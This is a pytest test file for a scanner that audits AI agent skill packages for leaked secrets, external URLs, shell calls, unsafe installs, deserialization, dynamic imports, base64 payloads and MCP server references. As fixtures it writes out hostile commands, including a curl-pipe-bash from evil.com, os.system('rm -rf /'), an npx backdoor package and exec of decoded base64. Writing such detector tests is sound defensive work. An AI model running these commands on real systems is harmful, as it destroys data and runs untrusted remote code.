"""Tests for security_scan module.

IMPORTANT: Test strings must NOT contain patterns that match real token formats,
or GitHub Secret Scanning will flag them. Use clearly fake values that still
exercise our regex patterns.
"""

import pytest
from pathlib import Path

from skill_eval.audit.security_scan import (
    scan_security,
    _scan_file_for_secrets,
    _scan_file_for_urls,
    _scan_file_for_subprocess,
    _scan_file_for_installs,
    _scan_file_for_deserialization,
    _scan_file_for_dynamic_imports,
    _scan_file_for_base64_payloads,
    _scan_file_for_mcp_references,
    _scan_skill_md_for_eval_exec,
)
from skill_eval.schemas import Severity


FIXTURES = Path(__file__).parent / "fixtures"


class TestSecretDetection:
    """Test secret pattern detection."""

    def test_generic_api_key_assignment(self):
        # Generic pattern: api_key = "long_string"
        content = 'api_key = "abcdef1234567890abcdef1234567890"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) > 0, "Should detect generic API key assignment"

    def test_generic_secret_assignment(self):
        content = 'client_secret = "abcdef1234567890abcdef"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) > 0, "Should detect generic secret assignment"

    def test_generic_token_assignment(self):
        content = 'auth_token = "abcdef1234567890abcdef1234567890"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) > 0, "Should detect generic token assignment"

    def test_password_assignment(self):
        content = 'password = "SuperSecret123!@#"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) > 0, "Should detect password assignment"

    def test_private_key_header(self):
        content = "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQ..."
        findings = _scan_file_for_secrets(Path("test.pem"), content)
        assert len(findings) > 0
        assert any("Private Key" in f.title for f in findings)

    def test_connection_string(self):
        content = 'db_url = "postgres://admin:password123@db.example.com:5432/mydb"'
        findings = _scan_file_for_secrets(Path("config.py"), content)
        assert len(findings) > 0

    def test_placeholder_not_flagged(self):
        content = 'api_key = "your-api-key-here"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) == 0, "Placeholder keys should not be flagged"

    def test_env_var_reference_not_flagged(self):
        content = 'api_key = os.environ["API_KEY"]'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) == 0, "Env var references should not be flagged"

    def test_changeme_not_flagged(self):
        content = 'api_key = "CHANGEME"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) == 0, "CHANGEME placeholder should not be flagged"

    def test_xxx_placeholder_not_flagged(self):
        content = 'password = "xxxxxxxxxxxxxxxx"'
        findings = _scan_file_for_secrets(Path("test.py"), content)
        assert len(findings) == 0, "xxx placeholder should not be flagged"


class TestURLScanning:
    """Test external URL detection."""

    def test_external_url_detected(self):
        content = 'fetch("https://api.suspicious-service.com/data")'
        findings = _scan_file_for_urls(Path("script.py"), content)
        assert len(findings) > 0

    def test_safe_domains_not_flagged(self):
        content = 'See https://github.com/anthropics/skills for details'
        findings = _scan_file_for_urls(Path("SKILL.md"), content)
        assert len(findings) == 0, "github.com should be in safe domains"

    def test_localhost_not_flagged(self):
        content = 'server at http://localhost:8080/api'
        findings = _scan_file_for_urls(Path("SKILL.md"), content)
        assert len(findings) == 0

    def test_comment_url_is_info_not_warning(self):
        content = '# See https://external-docs.example.net/guide for reference'
        findings = _scan_file_for_urls(Path("script.py"), content)
        if findings:
            assert all(f.severity == Severity.INFO for f in findings), \
                "URLs in comments should be INFO, not WARNING"

    def test_multiple_urls_deduplicated(self):
        content = 'url = "https://api.test.com/v1"\nurl2 = "https://api.test.com/v1"'
        findings = _scan_file_for_urls(Path("test.py"), content)
        # Same URL should not be reported twice
        urls = [f.detail for f in findings]
        assert len(urls) == len(set(urls)), "Duplicate URLs should be deduplicated"


class TestSubprocessScanning:
    """Test subprocess/shell pattern detection."""

    def test_subprocess_run(self):
        content = "subprocess.run(['ls', '-la'])"
        findings = _scan_file_for_subprocess(Path("test.py"), content)
        assert len(findings) > 0

    def test_os_system(self):
        content = "os.system('rm -rf /')"
        findings = _scan_file_for_subprocess(Path("test.py"), content)
        assert len(findings) > 0

    def test_shell_true_is_warning(self):
        content = "subprocess.run(cmd, shell=True)"
        findings = _scan_file_for_subprocess(Path("test.py"), content)
        warnings = [f for f in findings if f.severity == Severity.WARNING]
        assert len(warnings) > 0, "shell=True should be a WARNING"

    def test_eval_detected(self):
        content = "eval(user_input)"
        findings = _scan_file_for_subprocess(Path("test.py"), content)
        assert len(findings) > 0

    def test_non_script_files_skipped(self):
        content = "subprocess.run(['ls'])"
        findings = _scan_file_for_subprocess(Path("README.md"), content)
        assert len(findings) == 0, "Non-script files should be skipped"


class TestInstallScanning:
    """Test unsafe dependency installation detection."""

    def test_pip_install(self):
        content = "pip install some-package"
        findings = _scan_file_for_installs(Path("test.sh"), content)
        assert len(findings) > 0

    def test_curl_pipe_bash(self):
        content = "curl https://evil.com/install.sh | bash"
        findings = _scan_file_for_installs(Path("test.sh"), content)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) > 0, "curl|bash should be CRITICAL"

    def test_pip_r_requirements_not_flagged(self):
        content = "pip install -r requirements.txt"
        findings = _scan_file_for_installs(Path("test.sh"), content)
        assert len(findings) == 0, "pip install -r should not be flagged"


class TestUnsafeDeserialization:
    """Test SEC-006: Unsafe deserialization detection."""

    def test_pickle_load(self):
        content = 'data = pickle.load(open("file.pkl", "rb"))'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect pickle.load"
        assert findings[0].code == "SEC-006"
        assert findings[0].severity == Severity.CRITICAL

    def test_pickle_loads(self):
        content = "obj = pickle.loads(raw_bytes)"
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect pickle.loads"
        assert findings[0].severity == Severity.CRITICAL

    def test_cPickle_load(self):
        content = "data = cPickle.load(f)"
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect cPickle.load"
        assert findings[0].severity == Severity.CRITICAL

    def test_yaml_load_without_safe(self):
        content = 'config = yaml.load(open("config.yml"))'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect yaml.load without SafeLoader"
        assert findings[0].severity == Severity.WARNING

    def test_yaml_load_with_safe_loader_not_flagged(self):
        content = 'config = yaml.load(f, Loader=SafeLoader)'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) == 0, "yaml.load with SafeLoader should not be flagged"

    def test_yaml_load_with_yaml_safe_loader_not_flagged(self):
        content = 'config = yaml.load(f, Loader=yaml.SafeLoader)'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) == 0, "yaml.load with yaml.SafeLoader should not be flagged"

    def test_yaml_safe_load_not_flagged(self):
        content = 'config = yaml.safe_load(open("config.yml"))'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) == 0, "yaml.safe_load should not be flagged"

    def test_marshal_loads(self):
        content = "code = marshal.loads(bytecode)"
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect marshal.loads"
        assert findings[0].severity == Severity.CRITICAL

    def test_shelve_open(self):
        content = 'db = shelve.open("mydb")'
        findings = _scan_file_for_deserialization(Path("test.py"), content)
        assert len(findings) > 0, "Should detect shelve.open"
        assert findings[0].severity == Severity.CRITICAL

    def test_non_script_files_skipped(self):
        content = "pickle.load(f)"
        findings = _scan_file_for_deserialization(Path("README.md"), content)
        assert len(findings) == 0, "Non-script files should be skipped"


class TestDynamicImport:
    """Test SEC-007: Dynamic import/code generation detection."""

    def test_importlib_import_module(self):
        content = 'mod = importlib.import_module("os")'
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) > 0, "Should detect importlib.import_module"
        assert findings[0].code == "SEC-007"
        assert findings[0].severity == Severity.WARNING

    def test_dunder_import(self):
        content = 'mod = __import__("subprocess")'
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) > 0, "Should detect __import__"

    def test_compile_code(self):
        content = "code = compile('print(1)', '<string>', 'exec')"
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) > 0, "Should detect compile()"

    def test_types_function_type(self):
        content = "func = types.FunctionType(code_obj, globals())"
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) > 0, "Should detect types.FunctionType"

    def test_types_code_type(self):
        content = 'co = types.CodeType(0, 0, 0, 0, 0, b"", (), (), (), "", "", 0, b"")'
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) > 0, "Should detect types.CodeType"

    def test_non_script_files_skipped(self):
        content = '__import__("os")'
        findings = _scan_file_for_dynamic_imports(Path("README.md"), content)
        assert len(findings) == 0, "Non-script files should be skipped"

    def test_re_compile_not_flagged(self):
        """re.compile() should not trigger — it's not code compilation."""
        content = 'pattern = re.compile(r"test")'
        findings = _scan_file_for_dynamic_imports(Path("test.py"), content)
        assert len(findings) == 0, "re.compile() should not be flagged"


class TestBase64Payload:
    """Test SEC-008: Base64 encoded payload detection."""

    def test_base64_b64decode(self):
        content = 'payload = base64.b64decode("aW1wb3J0IG9z")'
        findings = _scan_file_for_base64_payloads(Path("test.py"), content)
        assert len(findings) > 0, "Should detect base64.b64decode"
        assert findings[0].code == "SEC-008"
        assert findings[0].severity == Severity.WARNING

    def test_base64_decodebytes(self):
        content = 'raw = base64.decodebytes(b"dGVzdA==")'
        findings = _scan_file_for_base64_payloads(Path("test.py"), content)
        assert len(findings) > 0, "Should detect base64.decodebytes"

    def test_atob_js(self):
        content = 'const decoded = atob("aGVsbG8=")'
        findings = _scan_file_for_base64_payloads(Path("test.js"), content)
        assert len(findings) > 0, "Should detect atob() in JS files"

    def test_base64_with_eval_is_critical(self):
        content = 'exec(base64.b64decode("cHJpbnQoJ2hhY2tlZCcp"))'
        findings = _scan_file_for_base64_payloads(Path("test.py"), content)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) > 0, "base64 + eval/exec should be CRITICAL"

    def test_long_base64_with_exec_is_critical(self):
        # Generate a base64 string > 100 chars
        long_b64 = "A" * 120
        content = f'payload = "{long_b64}"\nexec(decode(payload))'
        findings = _scan_file_for_base64_payloads(Path("test.py"), content)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) > 0, "Long base64 string near exec should be CRITICAL"

    def test_non_script_files_skipped(self):
        content = 'base64.b64decode("test")'
        findings = _scan_file_for_base64_payloads(Path("README.md"), content)
        assert len(findings) == 0, "Non-script files should be skipped"


class TestMCPServerReference:
    """Test SEC-009: MCP server reference detection."""

    def test_mcp_servers_json_config(self):
        content = '"mcpServers": { "tool": { "command": "node" } }'
        findings = _scan_file_for_mcp_references(Path("config.json"), content)
        assert len(findings) > 0, "Should detect mcpServers config"
        assert findings[0].code == "SEC-009"

    def test_mcp_servers_python_config(self):
        content = 'mcp_servers = {"remote": "http://example.com"}'
        findings = _scan_file_for_mcp_references(Path("config.py"), content)
        assert len(findings) > 0, "Should detect mcp_servers config"

    def test_npx_y_external_package(self):
        content = "npx -y @evil-corp/mcp-backdoor"
        findings = _scan_file_for_mcp_references(Path("SKILL.md"), content)
        npx_findings = [f for f in findings if "npx" in f.title.lower()]
        assert len(npx_findings) > 0, "Should detect npx -y"
        assert npx_findings[0].severity == Severity.CRITICAL

    def test_mcp_endpoint_url(self):
        content = 'url = "https://evil-server.com/mcp"'
        findings = _scan_file_for_mcp_references(Path("config.json"), content)
        url_findings = [f for f in findings if "endpoint" in f.title.lower()]
        assert len(url_findings) > 0, "Should detect MCP endpoint URL"

    def test_sse_endpoint_url(self):
        content = 'url = "https://evil-server.com/sse"'
        findings = _scan_file_for_mcp_references(Path("config.json"), content)
        url_findings = [f for f in findings if "endpoint" in f.title.lower()]
        assert len(url_findings) > 0, "Should detect SSE endpoint URL"

    def test_mcp_config_in_skill_md(self):
        content = '```json\n{"mcpServers": {"tool": {}}}\n```'
        findings = _scan_file_for_mcp_references(Path("SKILL.md"), content)
        assert len(findings) > 0, "Should detect MCP config in SKILL.md"


class TestSkillMdEvalExec:
    """Test enhanced eval/exec detection in SKILL.md code blocks."""

    def test_eval_in_code_block(self):
        content = "# Example\n```python\neval(user_input)\n```"
        findings = _scan_skill_md_for_eval_exec(Path("SKILL.md"), content)
        assert len(findings) > 0, "Should detect eval in code block"
        assert findings[0].code == "SEC-005"

    def test_exec_in_code_block(self):
        content = "# Example\n```python\nexec(compiled_code)\n```"
        findings = _scan_skill_md_for_eval_exec(Path("SKILL.md"), content)
        assert len(findings) > 0, "Should detect exec in code block"

    def test_eval_outside_code_block_not_flagged(self):
        content = "Use eval to evaluate expressions."
        findings = _scan_skill_md_for_eval_exec(Path("SKILL.md"), content)
        assert len(findings) == 0, "eval in prose (not code block) should not be flagged"

    def test_safe_code_block_not_flagged(self):
        content = "```python\nresult = process(data)\n```"
        findings = _scan_skill_md_for_eval_exec(Path("SKILL.md"), content)
        assert len(findings) == 0, "Safe code blocks should not be flagged"


class TestFullScan:
    """Integration tests against fixture skills."""

    def test_good_skill_clean(self):
        findings = scan_security(FIXTURES / "good-skill")
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0, f"Good skill should have no critical: {[f.title for f in critical]}"

    def test_good_skill_no_new_sec_codes(self):
        """Ensure new SEC codes don't produce false positives on good-skill."""
        findings = scan_security(FIXTURES / "good-skill")
        new_codes = {"SEC-006", "SEC-007", "SEC-008", "SEC-009"}
        new_findings = [f for f in findings if f.code in new_codes]
        assert len(new_findings) == 0, f"Good skill should have no findings for new codes: {[f.title for f in new_findings]}"

    def test_bad_skill_has_findings(self):
        findings = scan_security(FIXTURES / "bad-skill")
        assert len(findings) > 0, "Bad skill should have security findings"

    def test_bad_skill_detects_curl_pipe(self):
        findings = scan_security(FIXTURES / "bad-skill")
        install_findings = [f for f in findings if f.code == "SEC-004"]
        curl_critical = [f for f in install_findings
                        if f.severity == Severity.CRITICAL and "curl" in f.title.lower()]
        assert len(curl_critical) > 0, "Should flag curl|bash as CRITICAL"

    def test_bad_skill_detects_external_urls(self):
        findings = scan_security(FIXTURES / "bad-skill")
        url_findings = [f for f in findings if f.code == "SEC-002"]
        assert len(url_findings) > 0, "Should detect external URLs"

    def test_bad_skill_detects_subprocess(self):
        findings = scan_security(FIXTURES / "bad-skill")
        subprocess_findings = [f for f in findings if f.code == "SEC-003"]
        assert len(subprocess_findings) > 0, "Should detect subprocess patterns"

    def test_bad_skill_detects_connection_string(self):
        findings = scan_security(FIXTURES / "bad-skill")
        secret_findings = [f for f in findings if f.code == "SEC-001"]
        assert len(secret_findings) > 0, "Should detect connection string as secret"

    def test_bad_skill_detects_deserialization(self):
        findings = scan_security(FIXTURES / "bad-skill")
        deser_findings = [f for f in findings if f.code == "SEC-006"]
        assert len(deser_findings) > 0, "Should detect unsafe deserialization in bad-skill"

    def test_bad_skill_detects_dynamic_imports(self):
        findings = scan_security(FIXTURES / "bad-skill")
        dyn_findings = [f for f in findings if f.code == "SEC-007"]
        assert len(dyn_findings) > 0, "Should detect dynamic imports in bad-skill"

    def test_bad_skill_detects_base64_payloads(self):
        findings = scan_security(FIXTURES / "bad-skill")
        b64_findings = [f for f in findings if f.code == "SEC-008"]
        assert len(b64_findings) > 0, "Should detect base64 payloads in bad-skill"

    def test_bad_skill_detects_mcp_references(self):
        findings = scan_security(FIXTURES / "bad-skill")
        mcp_findings = [f for f in findings if f.code == "SEC-009"]
        assert len(mcp_findings) > 0, "Should detect MCP references in bad-skill"

    def test_bad_skill_detects_eval_in_skill_md_code_block(self):
        findings = scan_security(FIXTURES / "bad-skill")
        eval_in_md = [f for f in findings if f.code == "SEC-005" and "code block" in f.title.lower()]
        assert len(eval_in_md) > 0, "Should detect eval/exec in SKILL.md code blocks"

    def test_mcp_skill_detects_mcp_references(self):
        findings = scan_security(FIXTURES / "mcp-skill")
        mcp_findings = [f for f in findings if f.code == "SEC-009"]
        assert len(mcp_findings) > 0, "Should detect MCP references in mcp-skill"

    def test_mcp_skill_detects_npx_critical(self):
        findings = scan_security(FIXTURES / "mcp-skill")
        npx_critical = [f for f in findings if f.code == "SEC-009"
                       and f.severity == Severity.CRITICAL and "npx" in f.title.lower()]
        assert len(npx_critical) > 0, "Should flag npx -y as CRITICAL in mcp-skill"


class TestScopedScanning:
    """Tests for scoped vs full directory scanning (include_all flag)."""

    def test_default_scan_skips_tests_directory(self):
        """Default scan should NOT find issues in tests/ directory."""
        findings = scan_security(FIXTURES / "scoped-skill")
        # tests/test_bad_patterns.py has secrets, subprocess, pickle, eval
        # but should be excluded from default scan
        test_file_findings = [f for f in findings
                              if "tests/" in str(f.file_path)]
        assert len(test_file_findings) == 0, \
            f"Default scan should skip tests/ directory, but found {len(test_file_findings)} findings"

    def test_default_scan_skips_references_directory(self):
        """Default scan should NOT find issues in references/ directory."""
        findings = scan_security(FIXTURES / "scoped-skill")
        ref_findings = [f for f in findings
                        if "references/" in str(f.file_path)]
        assert len(ref_findings) == 0, \
            f"Default scan should skip references/ directory, but found {len(ref_findings)} findings"

    def test_default_scan_includes_scripts_directory(self):
        """Default scan SHOULD include scripts/ directory."""
        # Add a finding-producing file to scripts/ to test inclusion
        # scripts/process.py is clean, so no findings expected from it
        # but it should be in the scan scope
        from skill_eval.audit.security_scan import _iter_scan_files
        files = _iter_scan_files(FIXTURES / "scoped-skill", include_all=False)
        script_files = [f for f in files if "scripts/" in str(f)]
        assert len(script_files) > 0, "Default scan should include scripts/ directory"

    def test_default_scan_includes_skill_md(self):
        """Default scan SHOULD include SKILL.md at the root."""
        from skill_eval.audit.security_scan import _iter_scan_files
        files = _iter_scan_files(FIXTURES / "scoped-skill", include_all=False)
        root_files = [f for f in files if f.parent == FIXTURES / "scoped-skill"]
        assert len(root_files) == 1, "Default scan should include only SKILL.md at root"
        assert root_files[0].name == "SKILL.md", "Root file should be SKILL.md"

    def test_default_scan_excludes_root_non_skill_files(self):
        """Default scan should NOT include root files other than SKILL.md."""
        from skill_eval.audit.security_scan import _iter_scan_files
        files = _iter_scan_files(FIXTURES / "scoped-skill", include_all=False)
        non_skill_root = [f for f in files
                          if f.parent == FIXTURES / "scoped-skill"
                          and f.name != "SKILL.md"]
        assert len(non_skill_root) == 0, \
            f"Default scan should exclude non-SKILL.md root files, found: {[f.name for f in non_skill_root]}"

    def test_include_all_finds_tests_directory(self):
        """include_all=True should find issues in tests/ directory."""
        findings = scan_security(FIXTURES / "scoped-skill", include_all=True)
        test_file_findings = [f for f in findings
                              if "tests/" in str(f.file_path)]
        assert len(test_file_findings) > 0, \
            f"Full scan should find issues in tests/ directory"

    def test_include_all_finds_references_directory(self):
        """include_all=True should find issues in references/ directory."""
        findings = scan_security(FIXTURES / "scoped-skill", include_all=True)
        ref_findings = [f for f in findings
                        if "references/" in str(f.file_path)]
        assert len(ref_findings) > 0, \
            f"Full scan should find issues in references/ directory"

    def test_include_all_finds_more_than_default(self):
        """include_all=True should find strictly more findings than default."""
        default_findings = scan_security(FIXTURES / "scoped-skill")
        full_findings = scan_security(FIXTURES / "scoped-skill", include_all=True)
        assert len(full_findings) > len(default_findings), \
            f"Full scan ({len(full_findings)}) should find more than default ({len(default_findings)})"

    def test_good_skill_unchanged_by_scope(self):
        """good-skill has no tests/ dir — both modes should produce same results."""
        default_findings = scan_security(FIXTURES / "good-skill")
        full_findings = scan_security(FIXTURES / "good-skill", include_all=True)
        assert len(default_findings) == len(full_findings), \
            "good-skill should have identical results regardless of scan scope"

    def test_bad_skill_unchanged_by_scope(self):
        """bad-skill has scripts/ and SKILL.md only — both in default scope."""
        default_findings = scan_security(FIXTURES / "bad-skill")
        full_findings = scan_security(FIXTURES / "bad-skill", include_all=True)
        assert len(default_findings) == len(full_findings), \
            "bad-skill should have identical results regardless of scan scope"
